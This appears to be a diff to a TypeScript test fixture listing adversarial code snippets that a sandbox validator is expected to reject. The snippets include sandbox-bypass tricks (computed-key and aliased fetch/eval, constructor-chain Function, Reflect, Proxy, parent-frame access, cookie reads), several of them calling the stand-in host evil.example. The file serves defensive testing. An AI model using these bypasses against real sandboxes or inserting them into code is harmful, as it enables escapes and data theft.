@@ -35,4 +35,21 @@ export const ADVERSARIAL_FIXTURES: readonly AdversarialFixture[] = [
   { name: "static-import", code: "import secret from 'https://evil.example/x.js';", expectedRule: "import" },
   { name: "dynamic-import", code: "import('https://evil.example/x.js');", expectedRule: "import" },
   { name: "require", code: "const fs = require('fs');", expectedRule: "require" },
+  // Bypass classes hardened after the Phase-20 adversarial review (all also contained by the
+  // runtime jail, but rejected here for defense-in-depth):
+  { name: "computed-fetch", code: "window['fetch']('https://evil.example');", expectedRule: "network" },
+  { name: "computed-eval", code: "globalThis['eval']('2+2');", expectedRule: "dynamic-eval" },
+  { name: "computed-parent", code: "self['parent'].location.href = 'x';", expectedRule: "host-access" },
+  { name: "computed-cookie", code: "const c = document['cookie'];", expectedRule: "storage" },
+  { name: "template-key", code: "window[`fetch`]('https://evil.example');", expectedRule: "network" },
+  { name: "concat-key-failclosed", code: "window['fe' + 'tch']('https://evil.example');", expectedRule: "host-access" },
+  { name: "dynamic-key-failclosed", code: "const k = 'fetch'; window[k]('https://evil.example');", expectedRule: "host-access" },
+  { name: "window-alias", code: "const w = window; w.fetch('https://evil.example');", expectedRule: "network" },
+  { name: "window-alias-chain", code: "const a = window; const b = a; b.parent.location;", expectedRule: "host-access" },
+  { name: "destructure-window", code: "const { fetch: f } = window; f('https://evil.example');", expectedRule: "network" },
+  { name: "destructure-shorthand", code: "const { localStorage } = window; localStorage.clear();", expectedRule: "storage" },
+  { name: "reflect-get", code: "Reflect.get(window, 'fetch');", expectedRule: "reflection" },
+  { name: "constructor-chain", code: "const f = [].constructor.constructor; f('return 1')();", expectedRule: "reflection" },
+  { name: "proxy", code: "const p = new Proxy({}, {});", expectedRule: "reflection" },
+  { name: "document-defaultview", code: "document.defaultView.parent.location;", expectedRule: "host-access" },
 ];
